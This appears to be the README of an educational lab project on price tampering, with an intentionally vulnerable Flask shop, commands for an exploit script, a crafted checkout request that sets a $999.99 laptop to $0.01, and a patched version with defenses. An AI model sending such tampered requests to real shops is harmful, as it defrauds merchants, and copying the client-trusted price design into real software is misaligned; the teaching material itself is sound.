# Price Tampering Exploit — Cybersecurity Project

**OWASP Category:** A04:2021 – Insecure Design
**Vulnerability:** Client-Side Price Trust (Price Tampering)
**Educational Use Only**

---

## What Is Price Tampering?

Web shops sometimes embed the item price as a hidden HTML field:

```html
<input type="hidden" name="price" value="999.99">
```

If the server reads that value without checking it against its own database,
an attacker can modify the field to any price — including `$0.01`.

This is a **client-side trust** vulnerability: the server trusts data that the
client controls.

---

## Project Structure

```
price-tampering-project/
├── vulnerable_app/
│   └── app.py              ← Intentionally vulnerable Flask shop (port 5000)
├── exploit/
│   └── price_tamper.py     ← Python exploit script (no Burp Suite required)
├── patched_app/
│   └── app_patched.py      ← Fixed version (port 5001)
└── README.md
```

---

## Setup

### Requirements

```
Python 3.8+
Flask
```

Install Flask (only dependency):

```bash
pip install flask
```

---

## Part 1 — Run the Vulnerable App

```bash
cd vulnerable_app
python app.py
```

Open your browser:
- **Shop:**   http://localhost:5000
- **Orders:** http://localhost:5000/orders  ← shows tampered orders highlighted in red

---

## Part 2 — Run the Exploit

The exploit script uses only Python's standard library (`urllib`, `argparse`).
No Burp Suite, no third-party tools required.

### Interactive mode (guided prompts)

```bash
cd exploit
python price_tamper.py
```

### One-liner (buy a $999.99 laptop for $0.01)

```bash
python price_tamper.py --product 1 --price 0.01
```

### Bulk order (buy 10 laptops for $0.01 each)

```bash
python price_tamper.py --product 1 --price 0.01 --qty 10
```

### Demo mode (exploit every product automatically)

```bash
python price_tamper.py --demo
```

### Target a different server

```bash
python price_tamper.py --target http://192.168.1.50:5000 --product 2 --price 0.01
```

### Expected output

```
[*] Target: http://localhost:5000
[*] Fetched 5 products from server.

[*] Exploit parameters:
    Product   : Laptop (ID 1)
    Real price: $999.99
    You pay   : $0.01
    Quantity  : 1

[*] Sending crafted POST request:
    URL     : http://localhost:5000/checkout
    Payload : product_id=1  price=0.01  quantity=1

[+] Server Response:
    Product       : Laptop
    Quantity      : 1
    Real price    : $999.99  (total: $999.99)
    Price PAID    : $0.01    (total: $0.01)
    Amount SAVED  : $999.98

  [EXPLOIT SUCCESSFUL] Server accepted tampered price!
```

---

## Part 3 — The Fix (Patched App)

```bash
cd patched_app
python app_patched.py     # runs on port 5001
```

Then re-run the exploit against the patched server:

```bash
python exploit/price_tamper.py --target http://localhost:5001 --product 1 --price 0.01
```

The server will ignore the `price` field and charge the real price regardless.

### Root cause & fix

| | Vulnerable | Patched |
|---|---|---|
| Price source | Client POST body (`request.form["price"]`) | Server-side catalog lookup |
| Client sends | `product_id`, **`price`**, `quantity` | `product_id`, `quantity` |
| Attack surface | Price field can be any value | No price field — nothing to tamper |

**Core fix (two lines):**

```python
# VULNERABLE — trusts client
price_paid = float(request.form.get("price", 0))   # attacker controls this

# PATCHED — looks up server-side
product    = PRODUCTS.get(product_id)
real_price = product["price"]                       # authoritative source
```

---

## How the Exploit Works (Technical Detail)

A normal browser checkout sends:

```
POST /checkout HTTP/1.1
Content-Type: application/x-www-form-urlencoded

product_id=1&price=999.99&quantity=1
```

The exploit simply crafts that same request with a different price:

```
POST /checkout HTTP/1.1
Content-Type: application/x-www-form-urlencoded

product_id=1&price=0.01&quantity=1
```

The server never validates whether `$0.01` matches the catalog price,
so it processes the order at the tampered amount.

---

## Defenses (Beyond the Basic Fix)

| Defense | Description |
|---|---|
| Server-side price lookup | Never accept monetary values from the client |
| HMAC-signed cart | Sign the cart server-side; verify on checkout |
| Session-stored cart | Store cart contents in server-side session, not in form fields |
| Input validation | Reject prices that differ from catalog by more than a tolerance |
| Logging & alerting | Flag orders where price differs from catalog (the vulnerable app already does this for demo purposes) |

---

## References

- [OWASP A04:2021 – Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [OWASP Testing Guide – Testing for Client-Side Price Manipulation](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html)
